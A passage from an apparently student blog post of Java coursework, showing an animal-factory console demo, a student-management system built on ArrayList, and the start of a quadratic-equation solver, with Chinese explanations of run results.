class="doctag">@author</span> ZHANG Xiyuan, CUMT</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateDate</span>: 2021.12.03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;********* Welcome to the Animal Factory! *********&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;There are the following animals to choose from: \nBear, Panda, Rabbit, Tiger&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;If you want to add an animal, you only need to enter the name of the above animal, not case sensitive.&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Type q to exit.&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;\nPlease input an animal: &quot;</span>);</span><br><span class="line">            String in = scanner.next();</span><br><span class="line">            <span class="keyword">if</span>(in.equalsIgnoreCase(<span class="string">&quot;q&quot;</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            AnimalFactory.getAnimal(in);</span><br><span class="line">            System.out.println(<span class="string">&quot;The current total number of all animals is: &quot;</span> + Animal.sumall);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/0dd6c0bf29ed5ddb9670c2c4bd982455.png">下面是UML类图：</p><h4 id="效果演示："><a href="#效果演示：" class="headerlink" title="效果演示："></a>效果演示：</h4><p><img src="/img/36e88f56afc3518cbfb318680b9f99e8.png"></p><p>最后演示一下如何扩展AnimalFactory，添加一种动物，假如添加Elephant大象，非常简单：</p><p><img src="/img/f8ed1379a1da7123d91a487b77bef2b7.png"></p><p>1.在项目内复制随意一个动物类文件，改名，动物类内其他代码不用改动；</p><p>2. 在AnimalFactory内添加一个静态对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Elephant elephant = <span class="keyword">new</span> Elephant();</span><br></pre></td></tr></table></figure><p>3. 加一个 else if语句，同样复制一下改名即可：<img src="/img/2ac5da49df54425d62607eed16875aaf.png"></p><p>完成。演示一下效果：</p><p><img src="/img/73b00a8b86cdd3bea9d7011022ffa96d.png"></p><h2 id="作业三"><a href="#作业三" class="headerlink" title="作业三"></a>作业三</h2><h3 id="用泛型List管理学生信息"><a href="#用泛型List管理学生信息" class="headerlink" title="用泛型List管理学生信息"></a>用泛型List管理学生信息</h3><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stuid;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String stuid, String name, <span class="keyword">int</span> age, String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stuid = stuid;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getStuID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stuid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentManager</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------- Welcome to the Student Management System ----------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Student&gt; stuCollection = <span class="keyword">new</span> ArrayList&lt;Student&gt;();</span><br><span class="line">        Student stu1 = <span class="keyword">new</span> Student(<span class="string">&quot;08190001&quot;</span>,<span class="string">&quot;Alex&quot;</span>,<span class="number">20</span>,<span class="string">&quot;Chaoyang District, Beijing&quot;</span>);</span><br><span class="line">        Student stu2 = <span class="keyword">new</span> Student(<span class="string">&quot;08190018&quot;</span>,<span class="string">&quot;Christian&quot;</span>,<span class="number">21</span>,<span class="string">&quot;Quanshan District, Xuzhou City&quot;</span>);</span><br><span class="line">        Student stu3 = <span class="keyword">new</span> Student(<span class="string">&quot;08198888&quot;</span>,<span class="string">&quot;Edward&quot;</span>,<span class="number">19</span>,<span class="string">&quot;Brooklyn, New York City&quot;</span>);</span><br><span class="line">        Student stu4 = <span class="keyword">new</span> Student(<span class="string">&quot;08199900&quot;</span>,<span class="string">&quot;Herman&quot;</span>,<span class="number">20</span>,<span class="string">&quot;East Bay, San Francisco&quot;</span>);</span><br><span class="line"></span><br><span class="line">        stuCollection.add(stu1);</span><br><span class="line">        stuCollection.add(stu2);</span><br><span class="line">        stuCollection.add(stu3);</span><br><span class="line">        stuCollection.add(stu4);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;\n[A]AddStudent\t[D]DeleteStudent\t[E]EditStudent\n[V]ViewStudents\t[F]FindStudent\t\t[Q]Quit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Please enter function code: &quot;</span>);</span><br><span class="line">            Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">            String line = sc.nextLine();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (line.toUpperCase()) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;A&quot;</span> -&gt; addStudent(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;D&quot;</span> -&gt; deleteStudent(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;E&quot;</span> -&gt; modifyStudentInformation(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;V&quot;</span> -&gt; viewAllStudent(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;F&quot;</span> -&gt; findStudentAndDisplay(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;Q&quot;</span> -&gt; System.exit(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;⚠ Incorrect function code!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addStudent</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span> </span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String stuid;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Enter student ID：&quot;</span>);</span><br><span class="line">            stuid = sc.nextLine();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> i = findStudent(stuCollection, stuid);</span><br><span class="line">            <span class="keyword">if</span> (i != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;⚠ The student information you want to add already exists The student information you want to add already exists!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Enter the student&#x27;s name：&quot;</span>);</span><br><span class="line">        String name = sc.nextLine();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Enter the age of the student：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> age = sc.nextInt();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Enter the student&#x27;s residential address：&quot;</span>);</span><br><span class="line">        String address = sc.next();</span><br><span class="line"></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(stuid, name, age, address);</span><br><span class="line">        stuCollection.add(stu);</span><br><span class="line">        System.out.println(<span class="string">&quot;✅️Added successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">findStudent</span><span class="params">(ArrayList&lt;Student&gt; stuCollection, String stuid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; stuCollection.size(); i++) &#123;</span><br><span class="line">            Student stu = stuCollection.get(i);</span><br><span class="line">            <span class="keyword">if</span> (stuid.equals(stu.getStuID())) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">findStudentAndDisplay</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the student ID of the student you want to find:&quot;</span>);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String stuid = sc.nextLine();</span><br><span class="line">        <span class="keyword">int</span> i = findStudent(stuCollection,stuid);</span><br><span class="line">        <span class="keyword">if</span> (i == -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;⚠ The student&#x27;s information you want to find does not exist!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Find the following students:&quot;</span>);</span><br><span class="line">        System.out.format(<span class="string">&quot;%-14s%-14s%-14s%-14s&quot;</span>,<span class="string">&quot;StudentID&quot;</span>,<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;Age&quot;</span>,<span class="string">&quot;Address&quot;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.format(<span class="string">&quot;%-14s%-14s%-14s%-14s\n&quot;</span>, stuCollection.get(i).getStuID(),stuCollection.get(i).getName(),stuCollection.get(i).getAge(),stuCollection.get(i).getAddress());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">viewAllStudent</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stuCollection.size() == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;⚠ No student found.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.format(<span class="string">&quot;%-14s%-14s%-14s%-14s&quot;</span>,<span class="string">&quot;StudentID&quot;</span>,<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;Age&quot;</span>,<span class="string">&quot;Address&quot;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">for</span> (Student student : stuCollection) &#123;</span><br><span class="line">            System.out.format(<span class="string">&quot;%-14s%-14s%-14s%-14s\n&quot;</span>,student.getStuID(),student.getName(),student.getAge(),student.getAddress());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deleteStudent</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the student ID you want to delete：&quot;</span>);</span><br><span class="line">        viewAllStudent(stuCollection);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String stuid = sc.nextLine();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = findStudent(stuCollection, stuid);</span><br><span class="line">        <span class="keyword">if</span> (i == -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;⚠ The student&#x27;s information you want to delete does not exist!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        stuCollection.remove(i);</span><br><span class="line">        System.out.println(<span class="string">&quot;✅️Deleted successfully.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">modifyStudentInformation</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the student ID of the student you want to modify：&quot;</span>);</span><br><span class="line">        viewAllStudent(stuCollection);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String stuid = sc.nextLine();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = findStudent(stuCollection, stuid);</span><br><span class="line">        <span class="keyword">if</span> (i == -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;⚠ The student&#x27;s information you want to modify does not exist&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the revised name:&quot;</span>);</span><br><span class="line">        String name = sc.nextLine();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the revised age:&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> age = sc.nextInt();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the revised address:&quot;</span>);</span><br><span class="line">        String address = sc.next();</span><br><span class="line"></span><br><span class="line">        Student s = <span class="keyword">new</span> Student(stuid, name, age, address);</span><br><span class="line">        stuCollection.set(i, s);</span><br><span class="line">        System.out.println(<span class="string">&quot;✅️Modified successfully.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>1.首先查看学生（系统自带四个学生)。然后添加学生Max。</p><p><img src="/img/eb01f612b479d47dda3e7e5206e90cf1.jpeg"></p><p>2. 再次查看学生，Max已被添加。</p><p><img src="/img/6e1646362410d2732508e1b02a50149b.jpeg"></p><p>3.输入E（不区分大小写）修改学生。此时将会自动显示所有学生。如果输入错误的学号将会报错。</p><p><img src="/img/87564068d6bd9302a7080dd99f3b3828.jpeg"></p><p>修改学号为08190001的学生（Alex）的信息。之后查看所有学生信息，Alex的信息已被修改。</p><p><img src="/img/3560809e5ff63a802aab3c29bcc7345c.jpeg"></p><p>4.删除学生。同样的，如果输入错误的学号将会报错。现在删除Edward的信息，删除完成后查看所有学生信息，Edward已被删除。</p><p><img src="/img/4ff43adc7e9f12469d105d39eaaf67a6.jpeg"></p><p>5. 查找学生。如果输入错误的功能代号（Function Code）将会报错。查找学号为08199900的学生，如果找到则返回信息。输入Q退出系统。</p><p><img src="/img/fd9ce3de0c696ad78e3b3f0a37a78271.jpeg"></p><h3 id="设计一个求一元二次方程根的程序"><a href="#设计一个求一元二次方程根的程序" class="headerlink" title="设计一个求一元二次方程根的程序"></a>设计一个求一元二次方程根的程序</h3><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryLinearEquation</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String show;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> a;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> b;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> c;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> x1;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> x2;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> real;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> complex;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isComplex = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BinaryLinearEquation</span><span class="params">(<span class="keyword">double</span> A, <span class="keyword">double</span> B, <span class="keyword">double</span> C)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = A;</span><br><span class="line">        <span class="keyword">this</span>.b = B;</span><br><span class="line">        <span class="keyword">this</span>.c = C;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">this</span>.isComplex)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The equation is\n&quot;</span> + <span class="keyword">this</span>.a + <span class="string">&quot;x^2 + &quot;</span> + <span class="keyword">this</span>.b + <span class="string">&quot;x + &quot;</span> + <span class="keyword">this</span>.c +</span><br><span class="line">                <span class="string">&quot;\nThe solution of this equation is:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;x1 = &quot;</span> + <span class="keyword">this</span>.x1 + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;x2 = &quot;</span> + <span class="keyword">this</span>.x2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;The equation is\n&quot;</span> + <span class="keyword">this</span>.a + <span class="string">&quot;x^2 + &quot;</span> + <span class="keyword">this</span>.b + <span class="string">&quot;x + &quot;</span> + <span class="keyword">this</span>.c +</span><br><span class="line">                    <span class="string">&quot;\nThe solution of this equation is:\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;x1 = &quot;</span> + <span class="keyword">this</span>.real + <span class="string">&quot; + &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i\n&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;x2 = &quot;</span> + <span class="keyword">this</span>.real + <span class="string">&quot; - &quot;</span> + <span class="keyword">this</span>.complex + <span class="string">&quot;i&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Solve</span><span class="params">()</span> <span class="keyword">throws</span> NonQuadraticEquationException </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> delta = <span class="keyword">this</span>.b * <span class="keyword">this</span>.b - <span class="number">4</span> * <span class="keyword">this</span>.a * <span class="keyword">this</span>.c;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.a == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NonQuadraticEquationException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (delta &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.isComplex = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (b != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.real = ((-<span class="number">1</span>) * b) / 